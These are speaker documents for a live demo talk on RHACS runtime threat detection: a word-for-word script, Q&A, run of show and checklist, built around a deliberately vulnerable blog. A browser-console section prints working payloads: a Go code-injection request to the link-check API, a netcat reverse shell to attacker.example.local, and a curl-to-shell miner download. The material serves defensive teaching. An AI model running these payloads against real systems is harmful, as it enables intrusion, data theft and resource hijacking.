docs.title: Q&A — one line each
docs.text: They ask You say Just a bad developer? A normal shortcut. It passed every check. We use trusted vendors. Keep doing it. It lowers the risk. It does not remove it. We sign and have SBOMs. A signature proves who built it. Not that the code is honest. We have a WAF. Maybe it blocks this request. It has no rule for a zero-day. Distroless? Good. But attackers bring their own tools — like the miner. We have EDR. RHACS adds the context — which app, what is normal — and acts in Kubernetes. Kill breaks production. One pod, replaced in seconds. Alert first. Enforce later. Anything before the kill? Less than one second. The network policy removes even that. What triggers the kill? A program outside the normal list. Port 443? Allowed — you still see the new destination on the graph. Add an egress allow-list. False alarms? The normal list is per application. A trap file almost never.

docs.title: Never say
docs.text: "unhackable" · "we" (it is I — I built it) · "like yours" · "every CVE was a zero-day" · "a clean scan is a timestamp" · "nothing real to steal" · idioms

docs.title: RHACS - Threat Detection and Response: the talk, word for word
docs.text:
40 minutes. Spoken text is plain. Stage directions are in [italics in brackets]. ⏱ marks where you should be on the clock. Pauses are part of the script — take them.

Written in simple English: short sentences, common words, no idioms. The key messages repeat on purpose — it helps people who are listening in a second language.

The three threads — three ways a vulnerability gets into an application with a green pipeline:

  • What nobody knows yet — a zero-day. There is no CVE yet, so a scanner cannot find it.
  • What nobody noticed — a misconfiguration. Here: no network policy.
  • What somebody hid — a supply-chain attack. A bad library, a broken build tool, a hidden change.

And one piece of advice that runs alongside: know where your components come from. Trusted sources lower the risk. They do not remove it. That is why you also watch what your applications do.

Companion docs: TALK.md (run of show, speaking guide, Q&A, checklist) · WALKTHROUGH.md (what every screen looks like) · ../README.md (setup).

docs.title: ⏱ 0:00 — Slide 1: the pipeline
docs.text:
[Slide 1 up: slides/release.png — the release pipeline, every job green. Wait a few seconds. Let people read.]

This is my release pipeline.

I built a small blog for today's demo. Before I deployed it, I made sure it went through the same checks as any application before production.

[Point along the jobs.]

Build. Image scan. Policy check. Security approval. Deploy.

[Point down the summary.]

The image scan found zero vulnerabilities. Zero. Not low. Zero.

The application uses one small open-source library — and it has zero CVEs. The base image is up to date. There is no package manager inside.

It runs without root. Its files are read-only. It has no extra privileges. It has no Kubernetes token.

The policy check found no problems. It has the lowest risk in the whole cluster.

[Point at the security approval.]

Every check passed. Approved for production.

[Pause.]

Everything on this slide is true. In a few minutes, you will see it all in the console.

[Point at deploy-production.]

But look where the pipeline ends: deploy. Every check happens during build and during deployment — before the application runs. After deploy, the application is live. It takes traffic from the internet. And those checks see nothing.

Today is about what happens after deploy, while the application runs. That is runtime security.

[Pause.]

And one more thing. Remember this slide. Not for what is on it. For what is missing.

docs.title: ⏱ 1:30 — Slide 2: today and tomorrow
docs.text:
[Slide 2: "Secure today. Maybe not tomorrow."]

Every one of those checks was done before the application runs. So every green check is true at one moment: the moment I checked.

I scanned it yesterday. It was clean. Is it still clean today?

[Pause.]

New vulnerabilities are published every day. Your image did not change. What the world knows about it did. Secure today. Maybe not tomorrow.

RHACS handles this. Every four hours, it scans every running image again, with the newest vulnerability data. A new CVE this afternoon — you see it this afternoon. No rebuild. You know the day it changes.

But a scan, even a fresh one, only finds what is known. There are three things it cannot see.

[Click: the three cards.]

One: what nobody knows yet. A zero-day. No CVE. No patch. Nothing for a scanner to find.

Two: what nobody noticed. A misconfiguration. A setting nobody checked.

Three: what somebody hid. A supply-chain attack. The attacker does not attack you. They attack something you use.

[Click: what helps.]

So what helps? Trusted sources and trusted vendors. Signed images, checked before they run. And rescanning, all the time. Do all of it.

[Click: "It lowers the risk. It does not remove it."]

It lowers the risk a lot. It does not remove it.

A recent example: Claude Code, end of October. Someone put a backdoor into the real extension, in the Cursor store. It opened a remote connection into the developer's computer. Up to five thousand developers installed it.

They did everything right: a trusted tool, from a trusted store. And no scanner knew about it.

So you need one more thing: watch what your applications do.

docs.title: ⏱ 3:30 — Slide 3: what's watching
docs.text:
[Slide 3: "Made of → Deployed → Talks to → Behaves → Acts". Show one word at a time.]

So what is watching this cluster? RHACS. It knows five things about every application.

[Show: Made of.]

What it is made of. Every library, every package. And where it comes from: which registry, and if the image is signed.

[Show: Deployed.]

How it is deployed. Which user. Which privileges. Which secrets. If it is open to the internet.

[Show: Talks to.]

Who it talks to. Which services, which namespaces, which addresses on the internet. And who it has never talked to.

[Show: Behaves.]

How it behaves. Which programs it runs. Which files it changes. What is normal for this one application.

[Show: Acts.]

And it acts. A new program, a new file, a new connection — it sees the change. It can kill the pod, automatically, before a person reads the alert. And it shows you which connections to close.

[Pause.]

Today, I test that. Live.

[Switch to the browser. No more slides — only one quick look back at slide 1 in Act 3.]

docs.title: ⏱ 5:00 — Act 1: All green
docs.text:
[Browser: the blog home page.]

This is my blog.

[Point at the third post.]

This post is about the newest feature.

[Click Write.]

This is the editor. A writer pastes a text and clicks Check links —

[Click Check links. Results appear, all green.]

— and the blog checks every link before it is published. It is useful. The writers love it. I built it in one afternoon.

Now, what did the pipeline say?

[RHACS → Vulnerability Management → Images without CVEs.]

First word: made of.

This page shows images with no vulnerabilities. Here is my blog.

[Click unhackable/blog:v1.]

Zero critical. Zero important. Zero moderate. Zero low. Nothing to fix.

[Point at the labels at the top: registry, OS, "No signature found", scan time.]

It also shows where the image comes from. Which registry. Which operating system. And if it is signed. Mine is not signed. In a real production system, you should sign it — and check the signature before it runs.

[RHACS → Risk → blog.]

Second word: deployed.

This is everything about the deployment that adds risk. The list is very short. Two writable folders. One secret. One port inside the cluster. That's all.

No root. Read-only files. No extra privileges. No Kubernetes token. So even if someone gets in, there is no key to the cluster.

[RHACS → Violations, filtered to the namespace.]

And violations: none.

[Turn to the audience.]

So the pipeline was right. Every check is green.

So — is it secure?

[Pause. Three full seconds.]

docs.title: ⏱ 8:00 — The pivot
docs.text:
Look at that link checker again. Writers wanted more than a yes or no, so it lets them attach a small rule to check a link.

To run the rules, I used a small Go interpreter — a library called yaegi. Zero CVEs. And to make the rules more useful, I gave it one more thing: the power to run commands.

A normal shortcut, made under time pressure. One clean library. Zero CVEs.

[Pause.]

And one big vulnerability.

So what happens if I send a rule instead of a link?

docs.title: ⏱ 8:30 — Act 2: Day zero
docs.text:
[Terminal A, large font.]

scripts/demo.sh act2

[The commands run. id, uname, /etc/os-release come back. Let people read.]

I just ran my own commands inside the application. From outside. Through the website. With one form.

And this is not a CVE. There is no package to update. No security notice. Nobody in the world knows about it — except me.

This is a zero-day. My own. Tomorrow, it could be in a library in your image. The scanner says zero. The scanner is right. And it does not help.

[Pause.]

Now a harder question. What if this was not a mistake?

What if someone added it on purpose? A bad pull request. A changed library. A hacked build step. The code would look the same. The scan would say zero.

From the code alone, you cannot tell a mistake from a backdoor. And no scanner can.

[RHACS → Violations.]

So — did anyone notice?

[Point at "TDR – Unauthorized process in the Unhackable Blog", Critical.]

Yes. In seconds.

[Click it.]

Here are my exact commands. id. uname. cat. head. In which container. As which user. At what time.

This is the fourth word: behaves.

This application runs exactly one program: itself. It never starts another one. So its normal list has one line. I set that list, and I locked it. Anything else is someone else.

Look at what the attacker used: id, cat. Normal Linux tools. Nothing an antivirus calls bad. RHACS does not need to know what an attack looks like. It only needs to know what normal looks like.

And it does not care who wrote the code. A mistake or a backdoor — like the one in the Claude Code extension — must do something to be useful. Run a program. Write a file. Open a connection. That is what RHACS watches. A backdoor can look clean. It cannot behave clean.

docs.title: ⏱ 12:00 — Act 3: Loot
docs.text:
[Terminal A.]

scripts/demo.sh act3

Now think like an attacker. You are inside. What do you do first?

You look for passwords and keys.

[The token check and environment check come back empty.]

And here, the hardening works. There is no Kubernetes token. There are no secrets in the environment. The pipeline did a good job.

But wait —

[The .aws/credentials file appears, then the keys.]

Cloud keys! In a hidden folder. An access key and a secret key. And a second file, the .env: a database password and a payment key. For an attacker, this is perfect.

[Pause.]

I put them there.

These keys are fake. The application never reads these files. So the only one who reads them is someone who should not be there.

[RHACS → Violations → TDR – Honeytoken touched.]

This is a honeytoken. A trap. Nobody normal touches it, so it almost never gives a false alarm. The attacker took the bait. Here is the exact command.

[Back to the terminal output.]

Next, the attacker goes further. Can they reach the Kubernetes API? Yes, it answers. And the payment service?

[Point at the card data.]

Credit card numbers. From the payment service. Read by my blog.

[Pause.]

Now — remember the pipeline slide? And what was missing?

[Quick switch to slide 1, or just say it.]

Build. Scan. Policy check. Approval. Deploy. Nothing about the network. Nothing that says who this application may talk to.

There is no network policy. And in Kubernetes, the default is simple: everything can talk to everything. So my public blog can reach the payment service. It can reach the Kubernetes API. It can reach the whole internet.

Nobody decided that. Nobody noticed it. That is a misconfiguration.

[RHACS → Violations → TDR – Unexpected network flow to payments-api.]

Third word: talks to.

The payment service has a normal list of connections too. And it is empty. Nobody ever calls it. So the first call from the blog is clearly someone moving through your cluster — toward your most important data.

[Network Graph.]

And here it is on the map. The blog, reaching the payments.

docs.title: ⏱ 17:00 — Act 4: Persistence and profit
docs.text:
Until now, the attacker sent one command at a time, through the website. That is slow. An attacker wants a real shell.

[Turn to Terminal B. Make it visible.]

This terminal is the attacker's computer. It is outside the cluster. Its name is attacker.example.local. It is waiting for a call.

[Terminal B:]

scripts/attacker.sh c2

[Terminal A:]

scripts/demo.sh act4

[The reverse shell connects. Terminal B receives it.]

And the blog called the attacker. Out to the internet. Because nothing said it could not.

[Type slowly in Terminal B:]

id
hostname
ps

This is a live shell. Inside my "secure" application. Typed by a person on a computer outside the data center.

Now the attacker wants money.

[Terminal A continues: the miner is downloaded and started.]

The files of the application are read-only. But there are two small folders they can write to. One is /tmp. So they download a crypto miner into /tmp, make it executable, and start it.

[In Terminal B, type ps again. The miner is there.]

That is your cloud bill, mining money for someone else.

[Pause.]

[RHACS → Violations.]

So what did RHACS see? Every step.

[Point down the list.]

A reverse shell tool. A crypto miner. A program outside the normal list.

[Click TDR – Container drift.]

This one is about files. The application writes only to its own cache. So a new file in /tmp —

[Point at "created", then "permission changed".]

— made executable, is someone preparing tools inside the container. I did not write a rule for "miner". I wrote a rule for "this container changed".

[Network Graph. Click attacker.example.local.]

And here is the attacker on the map. Outside the cluster. Three connections from my blog: one download, one mining pool, one shell. All new. All outside the normal list.

[Turn to the audience.]

So, in about fifteen minutes: one unknown vulnerability — a mistake or a backdoor, it does not matter — and one missing network setting. And with that, the attacker ran commands, looked for keys, read card data, opened a shell from the internet, and started mining.

RHACS saw every step. In seconds.

But there is a problem.

[Pause.]

Seeing is not stopping. The miner is still running. The shell is still open.

docs.title: ⏱ 23:00 — Act 5: Respond
docs.text:
Last word: acts.

When you respond to an attack, you do two things, in order. First, limit the damage, now. Then, close the way in.

[RHACS → Policy Management, filter TDR.]

These are the rules that found the attack. I did not click them together in a screen. They are Kubernetes files, in Git. They go through the same review and pipeline as my code.

Step one: limit the damage.

[Terminal A:]

scripts/demo.sh act5

I am changing these rules from "tell me" to "act". If this application runs anything outside its normal list, kill the pod.

[Enforcement on. The attacker comes back with id.]

The attacker comes back. They run a command —

[Point at "pod KILLED by RHACS → replaced by clean …".]

— and the pod is gone.

[Point at Terminal B.]

And look at the attacker's shell. Silent. Dead. Nobody is on the other side anymore.

I did not patch anything. The bug is still there. But RHACS killed the hacked pod, and Kubernetes started a clean one from the original image, in a few seconds. The miner, the shell, the files in /tmp — all gone.

Every time they try again, the same thing happens. Every command costs them the pod. And I have time.

[Pause.]

Time is what I was missing. Between "someone found the vulnerability" and "the fix is in production", there is a gap. Days. Sometimes weeks. With a zero-day, you don't even know the gap has started. This is how you stay safe during that gap.

Step two: now that I have time, close the way in. And fix the misconfiguration.

[Act 5 continues: the NetworkPolicy is applied.]

This application needs only two things: DNS, and the internet on the web ports, to check links. Nothing else. So that is all it gets.

[The last call is made from inside the application itself — no new program. It times out.]

This last call is important. It runs inside the application itself — no new program. So the kill rule has nothing to see. But the network policy does not care how. The connection is not allowed. It times out. And the payment service now accepts no connections at all.

The kill stopped this attacker. The network policy stops the next one, before the first packet leaves.

[RHACS → Violations → TDR – Unauthorized process → Enforcement tab.]

And it is all recorded. "Kill Pod" — once for every attempt.

docs.title: ⏱ 29:00 — Act 6: Fix forward
docs.text:
Now, finally, I fix the real bug.

[Show the diff of linkcheck_v1.go → linkcheck_v2.go.]

This is the old code. "Built in one afternoon." And here is the problem, in two lines: take the writer's "rule", and run it as code — with the power to start programs.

And this is the fix. No more rules. Check that the link is a real web address, and fetch it with a normal web client. Nothing is run as code.

I did not have to guess where the problem was. RHACS showed me which feature was attacked, how, and from where. The fix is small.

[Terminal A:]

scripts/demo.sh act6

[Version 2 starts. The scan still says 0 CVEs. The attack now returns only "not a valid http(s) URL".]

Version two. Still zero CVEs. And the attack is now rejected: it is not a valid web address.

And remember: runtime security did not replace the fix. It kept me safe until the fix was ready. That is its job.

docs.title: ⏱ 32:00 — The tour
docs.text:
Look back at what you saw. It is all still here.

[RHACS → Violations, filtered to unhackable.]

One attack. Many alerts. Programs, files, keys, network. Each one shows the command, the user and the time. The evidence is already there.

[Network Graph → blog → attacker.example.local.]

Here is the whole attack as a map. Where it came from. Where it tried to go. Who the blog talked to for the first time.

[RHACS → Risk → blog.]

Remember the application with the lowest risk in the cluster?

[If the ranking moved, point at it. If not, go straight to the next stop.]

[RHACS → Vulnerability Management → blog:v1.]

And this page.

[Pause. Let people look.]

Still zero. It was right the whole time. And it saw nothing.

[Turn to the audience.]

Back to the five words.

Made of — zero CVEs, and where it comes from.

Deployed — hardened. And that helped: no Kubernetes token, no secrets in the environment. The only keys the attacker found were my trap.

Talks to — the call to payments. The calls to the attacker. The missing network policy.

Behaves — every command, every file. The zero-day — or the hidden backdoor.

Acts — the kill, and the network policy.

One product. One console. The same RHACS that does the vulnerability scanning. Today you saw all five words.

docs.title: ⏱ 37:00 — The close
docs.text:
[Step away from the keyboard. Leave the network graph on screen, or show a black screen.]

So, what should you take home?

Keep doing every check, in the pipeline and at deploy. Trusted sources. Signatures. Scans.

But a pipeline only checks what you know. It cannot see what nobody knows yet. What nobody noticed. Or what somebody hid.

So here are three questions for your team, when you are back at work.

Do you know which programs your containers should run?

Would you know, in one minute, if one of them ran something else?

And how fast could you stop it — without waking anyone up?

[Pause.]

A scan sees what is known. Runtime sees what happens. RHACS does both.

[Click.] See it, and stop it, while it happens. That is what you just saw.

[Click.] And fix it, before the vulnerability is public. Imagine having the fixed library before the rest of the world even knows about the vulnerability.

Thank you.

[Stop. No summary slide. Take questions.]

docs.title: Q&A — short answers
docs.text:
"Isn't this just a bad developer?" "No. It is a normal shortcut, made under time pressure, and it passed every check. And if it was a library with an unknown bug, the result would be the same. You cannot find unknown problems in advance."

"We only use trusted vendors and trusted libraries." "Good — please keep doing that. It is one of the best things you can do. But trusted sources lower the risk; they don't remove it. The backdoored Claude Code extension was the real one, in a trusted store. That is why you also watch behavior."

"We sign our images and create SBOMs." "Keep doing it. A signature proves who built the image. An SBOM shows what is inside. But neither proves the code is honest. The SolarWinds backdoor was in a correctly signed update."

"How does RHACS catch a supply-chain backdoor?" "By behavior. A backdoor that does nothing is harmless. When it runs a program, writes a file or calls home, that is outside the normal list. It does not matter who wrote the code."

"We have a WAF." "A WAF may block this attack. Maybe not the next one. And it has no rule for a zero-day. RHACS does not care how the attacker got in. It watches what they do inside."

"Our images are distroless." "Good, keep doing that. Fewer tools in the image makes the attacker's work harder. But they can bring their own tools — like the miner in the demo. And it does not fix the code, or the network."

"Why not have a network policy from day one?" "You should. That is the misconfiguration part of the story. The hard part is knowing what the policy should say. The RHACS network graph shows what each application really talks to. Start there."

"Kill Pod will break production." "It kills one pod. Kubernetes starts a new one in a few seconds. And you only turn it on when you know what normal looks like. First alert, later enforce. Like in the demo."

"Does the attacker get a connection before the kill?" "Yes, for less than one second. That is why step two is the network policy. It removes even that."

"What can trigger the kill?" "In the demo: a program outside the normal list. The network alert is on the payment service — you do not kill your payment service. You answer it with a network policy. That is why there are two steps."

"We already have EDR on the nodes." "Many EDR tools see programs on a machine. RHACS sees them with context: which application, which image, what is normal for it, who it talks to. And it responds in Kubernetes terms."

docs.title: RHACS - Threat Detection and Response: the talk
docs.text:
40 minutes · 3 intro slides · everything else live in RHACS

Secure today. Maybe not tomorrow. RHACS rescans every running image every 4 hours, so you know the day it changes. But a scan only sees what is known. A scan sees what is known. Runtime sees what happens. RHACS does both.

Audience: teams that think of RHACS (or container security in general) as vulnerability management. The goal is not to dismiss that — it's to show it is the first chapter, and that the product they already own does the rest.

  • The full talk, word for word (speaker notes): SCRIPT.md
  • One page to memorize: CHEATSHEET.md
  • This page: how to speak to the room, run of show, Q&A and checklist. Same content as a web page: TALK.html
  • Setup and the demo mechanics: ../README.md
  • What every act looks like on screen: WALKTHROUGH.md

docs.title: Run it from the browser (no terminal)
docs.text:
The attack can be fired straight from the blog itself. Open https://blog-unhackable.apps-crc.testing/write, press F12 → Console, and paste. The /write textarea only forwards real links (its JavaScript keeps https?://… and drops everything else), so the attacker goes around it and POSTs to the API — exactly what a real attacker does. Same code path as demo.sh, same RHACS detections. Each box has a Copy button — paste it into the console, press Enter.

Step 1 — show what is possible. The bug runs any command. Who am I, and what is in my environment?

const cmd = "id; env";
const rule = `(func() string { c, _ := base64.StdEncoding.DecodeString("${btoa(cmd)}"); out, _ := exec.Command("sh", "-c", string(c)).Output(); return string(out) })()`;
fetch('/api/links/check', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({urls:[rule]})})
  .then(r => r.json()).then(d => console.log(d.results[0].detail || d.results[0]));

Step 2 — later, weaponize it. Same bug, now a reverse shell home to the attacker (needs the C2 listener up — scripts/attacker.sh c2, or pane 2 in make live):

const cmd = "nohup nc attacker.example.local 4444 -e /bin/sh >/dev/null 2>&1 & echo '[+] reverse shell launched'";
const rule = `(func() string { c, _ := base64.StdEncoding.DecodeString("${btoa(cmd)}"); out, _ := exec.Command("sh", "-c", string(c)).Output(); return string(out) })()`;
fetch('/api/links/check', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({urls:[rule]})})
  .then(r => r.json()).then(d => console.log(d.results[0].detail || d.results[0]));

Swap in const cmd = "curl -s http://attacker.example.local:8080/stage.sh | sh"; for the crypto miner.

docs.title: How to speak to this room
docs.text:
The people in the room are CISOs, directors and architects. They decide budgets and architecture. They know security very well. They do not need deep technical words. And for many of them, English is a second or third language. So:

  • Short sentences. One idea per sentence. Then a pause.
  • Repeat the key messages. For people who listen in a second language, repeating is not boring. It helps.
  • Say what it means for the business. Not only "the pod was killed". Say "the attacker lost everything, in less than one second".
  • No idioms. They do not translate. Use the plain words below.
  • Slow down on numbers and names. "Zero. CVEs." "Less than. One. Second."
  • Say the step, then run the command. People must know what to look for before it appears on the screen.
  • Point at the screen. Show the one line that matters on each RHACS page. Do not read the whole page.

docs.title: Words to use
docs.text: Instead of… Say… blast radius the damage lateral movement, pivot moving to other systems exfiltrate, loot steal persistence staying inside C2, command and control the attacker's computer RCE, remote code execution running commands from outside process baseline the normal list of programs network baseline the normal list of connections drift a change inside the container enforcement an automatic action shift-left checks before deployment fix forward ship the fix stop the bleeding, crown jewels, game over, cash out (no idioms — say the plain thing)

docs.title: Terms to explain once, the first time you use them
docs.text: Term Say it like this CVE A known, published vulnerability. It has a number. Scanners look for these numbers. Zero-day A vulnerability that nobody knows about yet. No number. No patch. A scanner cannot find it. Container / pod The box the application runs in. Kubernetes can throw it away and start a new, clean one in seconds. Supply-chain attack The attacker does not attack you. They attack something you use: a library, a build tool, a base image. Honeytoken A trap. Fake keys that the application never uses. Only an intruder touches them. Baseline The normal list: the programs an application runs, and who it talks to. Anything outside the list is an alarm. Network policy A firewall rule for one application: who it may talk to, and nothing else. Policy as code The security rules are files in Git. They are reviewed and deployed like application code.

docs.title: What it means for the business
docs.text:
Say these in the tour and the close. This is what a CISO takes back to the board.

Question from the board Answer from the demo How fast do we see an attack? In seconds. Every step was an alert, with the exact command, user and time. How fast do we stop it? Automatically. The pod was killed in less than one second, without a person. Do we need to know the attack in advance? No. RHACS only needs to know what is normal for each application. Are we safe while the fix is not ready? Yes. The kill and the network policy protect the application until the fix ships. Do we have evidence for the investigation? Yes. Every alert, every kill, every connection is recorded. Is this a new tool? No. It is the same RHACS you use for vulnerability scanning — the other four words.

docs.title: The arc
docs.text:
1. The promise — a release pipeline where every job is green: zero CVEs, every best practice.
  2. Today and tomorrow — everything checked in the pipeline and at deploy is true only at the moment you checked. New vulnerabilities are disclosed every day, faster than ever, and the window to fix keeps shrinking. RHACS keeps up — it rescans every running image every 4 hours, so new CVEs show up without a rebuild. But a fresh scan still only finds what is known. Zero-days have no CVE yet, misconfiguration isn't on anyone's scanner, and supply-chain attacks plant vulnerabilities that scan clean — and get signed, if your pipeline signs.
  3. What's watching — something that knows every application: what it's made of, how it's deployed, who it talks to, how it behaves — and acts when that changes.
  4. The proof — break in live, without a single CVE. Watch RHACS see everything.
  5. The response — kill to shrink the blast radius now; network enforcement to close the door.
  6. The fix — fix forward. The scanner was right all along — and saw none of it.

docs.text:
Time Segment Screen Key line 0:00 Slide 1 — the pipeline slide "Every check happens during build and during deployment. Today is about what happens after." 1:30 Slide 2 — today and tomorrow slide "I scanned it yesterday. It was clean. Is it still clean today?" 3:30 Slide 3 — what's watching slide "Today, I test that. Live." 5:00 Act 1 — All green blog, RHACS "The pipeline was right. So — is it secure?" 8:30 Act 2 — Day zero terminal, Violations "From the code alone, you cannot tell a mistake from a backdoor." 12:00 Act 3 — Loot terminal, Violations, Network Graph "Not one step in the pipeline about who this app may talk to." 17:00 Act 4 — Persistence & profit 2 terminals, Violations, Network Graph "That's an interactive shell, inside your 'secure' app, from outside your cluster." 23:00 Act 5 — Respond Policies, terminal, Violations "The kill stopped this attacker. The NetworkPolicy stops the next one." 29:00 Act 6 — Fix forward diff, terminal, image page "Runtime didn't replace patching. It kept me safe until the patch was ready." 32:00 Live recap — the tour RHACS only "…and this page still says zero." 37:00 Close network graph or black "A scan sees what is known. Runtime sees what happens. RHACS does both." 38:00 Q&A

If time runs short: shorten Act 3 (the honeytoken alone is enough). Never cut Act 4 or Act 5 — they're what people retell.

docs.title: The attack chain — name each move for the audience
docs.text:
The scripts are deliberately quiet: they run the commands and show the output, nothing else. You narrate. As each command lands, say — in plain words — what the attacker is doing and why it matters. Every stage below maps to a real ATT&CK tactic and to the exact policy that lights up in the RHACS feed (pane 3 in make live), so what you say, what they see on the terminal, and what RHACS flags all line up.

Rule of thumb: say the stage, then run the command. "Now the attacker goes looking for credentials…" (run it) → RHACS fires → "…and RHACS already knows the app never touches that file."

Act Stage — say this ATT&CK tactic What the attacker does RHACS flags (pane 3) 2 Initial access + execution — "they turn a feature into a shell" Execution (T1059) The "Check links" rule engine evaluates their input as Go (yaegi, handed exec.Command) — remote code execution. No CVE, my own bug. TDR - Unauthorized process 3a Discovery — "first thing in, they look around" Discovery List the service-account dir, grep the environment for secrets. Hardening pays off: nothing there. TDR - Unauthorized process (every command is a new program) 3b Credential access — "they go hunting for keys" Credential Access (T1552.001) They check the obvious spots — ~/.aws/credentials, the app's .env — and find both: honeytokens I planted. The app never reads them, so any command that reads them = intruder. TDR - Honeytoken touched 3c Control-plane recon — "can they reach Kubernetes itself?" Discovery (T1613) They probe the in-cluster Kubernetes API (kubernetes.default). No service-account token, so it goes nowhere — but the attempt is the tell. TDR - Kubernetes API reconnaissance 3d Lateral movement — "pivot from the blog to the money" Lateral Movement From the public blog they reach payments-api and pull card data. The blog has never talked to payments before. TDR - Unexpected network flow to payments-api 4a Persistence + C2 — "they stop knocking and move in" Persistence / Command & Control A reverse shell calls home to the attacker's laptop — a live, interactive shell from outside the cluster. TDR - Reverse shell tool executed 4b Impact — "now they get paid" Impact (T1496, resource hijacking) They download and run a crypto miner into /tmp (root FS is read-only). TDR - Crypto miner, TDR - Container drift 5a Respond — contain now — "shrink the blast radius" — Turn on RHACS Kill Pod enforcement. The attacker's next command kills the pod; Kubernetes replaces it clean in seconds. enforcement kill (✖ POD KILLED) 5b Respond — close the door — "stop the next one" — Apply a NetworkPolicy: the blog keeps DNS + internet on 80/443 and nothing else. Even an allowed binary can't reach the attacker. flows blocked 6 Fix forward — "the real fix, no drama" — Ship v2: the rule engine is gone — links are validated natively, nothing is evaluated. Still zero CVEs. silence — the exploit is gone

The one-sentence spine: they got in with no CVE (Act 2), looted and pivoted (Act 3), moved in and cashed out (Act 4) — and RHACS saw every move within seconds (the feed), then stopped it two ways (Act 5), before I even shipped the fix (Act 6).

docs.text: What each beat should look like, so you can match the room to the screen (and recover from WALKTHROUGH.md if anything breaks live). Full-resolution captures live in img/.

docs.title: Slides (0:00 – 5:00)
docs.text: "Every job green. Zero CVEs. Every check happens during build and during deployment. Today is about what happens after."

The Kubernetes API reconnaissance violation (the control-plane probe, beat 3c) fires here too — it's a recent addition, so there's no capture of it yet; grab one next dry run.

docs.text: "The kill stopped this attacker. The NetworkPolicy stops the next one before the first packet leaves."

docs.title: The three slides
docs.text:
Slide What's on it Purpose 1 — The pipeline slides/release.png — a release pipeline run (build, image-scan, policy-check, security-approval, deploy-production), every job green; security approval: approved — all checks passed The promise. Note what's missing: no step about network policy. You come back to that in Act 3. 2 — Today and tomorrow one line: Secure today. Maybe not tomorrow. RHACS rescans every 4 hours, so you know the day it changes — for what is known. Zero-days, misconfiguration nobody checks and hidden backdoors stay invisible to any scan. 3 — What's watching Made of → Deployed → Talks to → Behaves → Acts What RHACS knows, without naming features ("made of" includes where it comes from: registry, signature). Each word pays off in an act.

The full spoken text for every slide, act, the tour and the close is in SCRIPT.md — written in simple English for audiences that aren't all native speakers.

docs.title: The three threads
docs.text:
Thread Where it shows Line What nobody knows yet — zero-days, unknown vulnerabilities Act 2: evaluating untrusted input as code has no CVE, no advisory, no signature "This is a zero-day. My own. The scanner says zero. The scanner is right. And it does not help." What nobody noticed — misconfiguration Act 3: no NetworkPolicy — and no pipeline step that checks for one — so the public blog can reach payments, the Kubernetes API and the internet "Nobody decided that. Nobody noticed it." What somebody hid — supply-chain attacks Slide 2 (the backdoored Claude Code extension, Oct 2026) and Act 2: the injectable line could just as well be a malicious PR or a poisoned dependency "From the code alone, you cannot tell a mistake from a backdoor. And no scanner can."

Alongside the threads: know where your components come from — trusted sources and trusted vendors, signed and verified images. That lowers the risk a lot; it doesn't remove it (the backdoored Claude Code extension was the real one, in a trusted store). That is why you also watch behavior.

All three are answered the same way: RHACS watches behavior, so intent doesn't matter — a mistake and a backdoor both have to do something. In Act 5 the kill buys time against the unknown and the planted, and the NetworkPolicy fixes the misconfiguration.

docs.title: The close
docs.text: "Keep doing every check, in the pipeline and at deploy. But a pipeline only checks what you know. It cannot see what nobody knows yet. What nobody noticed. Or what somebody hid. … A scan sees what is known. Runtime sees what happens. RHACS does both."

docs.title: Questions you'll get
docs.text:
Short answers. Say the first sentence, then stop. If they want more, they will ask.

Question Answer "Isn't this just a bad developer?" No. It was a normal shortcut, made under time pressure, and it passed every check. If it was a library with an unknown bug, the result would be the same. You cannot find unknown problems in advance. "We only use trusted vendors and trusted libraries." Good — please keep doing that. It is one of the best things you can do. But trusted sources lower the risk. They do not remove it. The backdoored Claude Code extension was the real one, in a trusted store. That is why you also watch behavior. "We sign our images and create SBOMs." Keep doing it. A signature proves who built the image. An SBOM shows what is inside. Neither proves that the code is honest. The SolarWinds backdoor was in a correctly signed update. "How does RHACS catch a supply-chain backdoor?" By behavior. A backdoor that does nothing is harmless. When it runs a program, writes a file or calls home, that is outside the normal list. It does not matter who wrote the code. "We have a WAF." Keep it. A WAF may block this request. Maybe not the next one. And it has no rule for a zero-day. RHACS does not care how the attacker got in. It watches what happens inside. "Our images are distroless." Good, keep doing that. Fewer tools makes the attacker's work harder. But they can bring their own tools — like the miner in the demo. And it does not fix the code, or the network. "We already have EDR on the servers." Many EDR tools see programs on a machine. RHACS sees them with context: which application, which image, what is normal for it, who it talks to. And it acts in Kubernetes terms: kill the pod, apply a network policy. "Why not have a network policy from day one?" You should. That is the misconfiguration part of the story. The hard part is knowing what the policy should say. The RHACS network graph shows what each application really talks to. Start there. "Kill Pod will break production." It kills one pod. Kubernetes starts a new, clean one in a few seconds. And you only turn it on when you know what normal looks like. First alert. Later, act. Like in the demo. "Does the attacker get anything before the kill?" For less than one second. That is why step two is the network policy. It removes even that. "What can trigger the kill?" In the demo: a program outside the normal list. The network alert is on the payment service — you do not kill your payment service. You answer it with a network policy. That is why there are two steps. "What if the attacker uses port 443, like normal web traffic?" Then this network policy lets it through, because the link checker needs the internet. You still see the new destination on the network graph. In production, add an allow-list of destinations — an egress firewall or a proxy. "How long does it take to learn what is normal?" RHACS learns by watching. You can also declare the normal list yourself, like I did, and lock it on day one. Start with the applications that matter most. "How much work is this for my team?" The rules are files in Git, reviewed like code. Start with alerts only. Turn on automatic actions where the normal list is stable. "Is this a separate product?" No. It is part of RHACS. The same console and the same cluster components you already use for vulnerability scanning. "What about false alarms?" The normal list is per application, so it is very precise. A trap file, like the honeytoken, has almost no false alarms: nobody normal ever touches it.

docs.title: Before you walk on stage
docs.text:
The day before

  • [ ] Full dry run, all six acts, with the clock
  • [ ] scripts/demo.sh reset works and leaves no violations
  • [ ] Slides 1–3 ready. slides/release.png is up to date (re-render it if you changed slides/release.html)

One hour before

  • [ ] Laptop plugged in (on battery, the CPU slows down and CRC gets slow)
  • [ ] scripts/demo.sh reset → scripts/demo.sh status shows v1, enforcement [], no network policies, no violations
  • [ ] scripts/attacker.sh status → attacker up, firewall open-for-crc
  • [ ] VPN off, or nordvpn whitelist add subnet 192.168.130.0/24 done once
  • [ ] Projector test: terminal font readable from the last row

Five minutes before

  • [ ] Terminal A (large font) in the demo folder. Terminal B ready for scripts/attacker.sh c2
  • [ ] Browser tabs, logged in (rox-ui): blog /write · RHACS Violations (unhackable) · Network Graph · Vulnerability Management · Risk
  • [ ] release.png full screen
  • [ ] make web-terminal running. Open docs/TALK.html → ▶ Present on the projector, Speaker view on your laptop screen
